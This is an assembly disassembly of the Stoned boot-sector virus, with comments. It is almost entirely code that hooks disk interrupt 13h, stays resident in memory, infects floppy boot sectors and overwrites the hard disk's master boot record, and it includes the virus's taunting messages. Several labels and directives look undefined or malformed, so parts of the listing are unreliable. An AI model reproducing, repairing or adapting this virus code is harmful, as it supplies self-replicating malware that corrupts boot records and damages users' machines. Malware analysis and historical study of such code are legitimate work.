

;        Stoned virus disassembly
;
Code_Seg segment public
;
assume cs:Code_Seg
org 0

start               db 0eah,5,0,0c0h,7      ; MASM can't handle far jumps.
; start:            jmp far 07c0h:05h       ; Jump to begin location.

begin:              jmp   install           ; Install in high memory.

drive_flag:         db    0                 ; 0 if floppy, 2 if hard disk.

int_13:             dw    2 dup (?)         ; Original INT 13 location.

free_mem:           dw    L00E4H            ; Free memory after 2K gone.
                    dw    ?

boot_location:      DW    L7C00H,L0000H     ; Boot location.

virus_code:         push ds
                    push ax
                    cmp ah,2
                    jc original_int_13
                    cmp ah,4
                    jnc original_int_13
                    or dl,dl
                    jnz original_int_13
                    xor ax,ax
                    mov ds,ax
                    mov al,ds:[043fh]
                    test al,1
                    jnz original_int_13
                    call infect_floppy

original_int_13:    pop ax
                    pop DS
                    jmp dword ptr cs:[9]

infect_floppy:      push bx
                    push cx
                    push dx
                    push es
                    push si
                    push di

                    mov si,4
read_sec:           mov ax,0201h
                    push cs
                    pop es
                    mov bx,0200h
                    xor cx,cx
                    mov dx,cx
                    inc cx
                    pushf
                    call dword ptr cs:[9]   ; Do a normal INT 13.
                    jnc check_boot
                    xor ax,ax
                    pushf
                    call dword ptr cs:[9]
                    dec si
                    jnz read_sec
                    jmp short resetreg
                    nop

check_boot:         xor si,si
                    mov di,0200h
                    cld
                    push cs
                    pop ds
                    lodsw
                    cmp ax, word ptr [di]
                    jnz copy_boot
                    lodsw
                    cmp ax, word ptr [di]+2
                    jz resetreg

copy_boot:          mov ax,0301h
                    mov bx,0200h
                    mov cl,3
                    mov dh,1
                    pushf
                    call dword ptr cs:[9]
                    jc resetreg
                    mov ax,0301h
                    xor bx,bx
                    mov cl,1
                    xor dx,dx
                    pushf
                    call dword ptr cs:[9]

resetreg:           pop di
                    pop si
                    pop es
                    pop dx
                    pop cx
                    pop bx
                    ret

install:            xor ax,ax
                    mov ds,ax
                    cli
                    mov ss,ax
                    mov sp,7C00h
                    sti
                    mov ax, word ptr [4Ch]
                    mov WORD PTR [L7C09H],ax
                    mov ax,WORD PTR [L004EH]
                    mov WORD PTR [L7C0BH],ax
                    mov ax,WORD PTR [L0413H]
                    DEC ax
                    DEC ax
                    mov WORD PTR [L0413H],ax
                    mov CL,OFFSET 6
                    SHL ax,CL
                    mov ES,ax
                    mov WORD PTR [L7C0FH],ax
                    mov ax,OFFSET L0015H
                    mov WORD PTR [L004CH],ax
                    mov WORD PTR [L004EH],ES
                    mov CX,OFFSET L01B8H
                    push CS
                    pop DS
                    XOR SI,SI
                    mov DI,SI
                    cld
                    repz movsb
                    jmp dword ptr cs:[Dh]

resetdsk:           mov ax,0
                    int 13h

                    xor ax,ax
                    mov ES,ax
                    mov ax,OFFSET L0201H
                    mov BX,OFFSET L7C00H
                    cmp BYTE PTR CS:[L0008H],0
                    JZ floppy
                    mov CX,OFFSET L0007H
                    mov DX,OFFSET L0080H
                    int 13h
                    JMP SHORT set_zero
                    NOP

floppy:             mov   CX,OFFSET L0003H
                    mov   DX,OFFSET start
                    int 13h
                    JC    set_zero
                    TEST  BYTE PTR ES:[L046CH],7
                    JNZ   done_msg
                    mov   SI,OFFSET L0189H
                    push  CS
                    pop   DS

loop_msg:           LODSB                   ;Load AL with byt at (SI)+-.
                    OR    AL,AL
                    JZ    done_msg
                    mov   AH,OFFSET 0EH
                    mov   BH,OFFSET 0
                    INT   10H               ;Display control interupt.
                    JMP   SHORT loop_msg

done_msg:           push  CS
                    pop   ES
                    mov   ax,OFFSET L0201H
                    mov   BX,OFFSET L0200H
                    mov   CL,OFFSET 1
                    mov   DX,OFFSET L0080H
                    int 13h
                    JC    set_zero
                    push  CS
                    pop   DS
                    mov   SI,OFFSET L0200H
                    mov   DI,OFFSET L0000H
                    LODSW                   ;Load ax with wrd at (SI)+-.
                    cmp   ax,WORD PTR [DI]
                    JNZ   infect_h
                    LODSW                   ;Load ax with wrd at (SI)+-.
                    cmp   ax,WORD PTR [DI]+2
                    jnz infect_hard

set_zero:           mov byte ptr cs:[8],0
                    jmp dword ptr cs:[11h]

infect_hard:        mov byte ptr cs:[8],2
                    mov ax,0301h
                    mov bx,0200h
                    mov cx,7
                    mov dx,80h
                    int 13h
                    jc set_zero
                    push cs
                    pop ds
                    push cs
                    pop es
                    mov si,03bEh
                    mov di,01bEh
                    mov cx,0242h
                    repz movsb
                    mov ax,0301h
                    xor bx,bx
                    inc cl
                    int 13h
                    jmp short set_zero

stoned_message:     db    7,'Your PC is now Stoned!',7,13,10,10,0

marijuana_message:  db    'LEGALISE MARIJUANA!'

                    db    dup 70 (0)
                    dw    55AAh

Code_Seg            ends
                    end   start

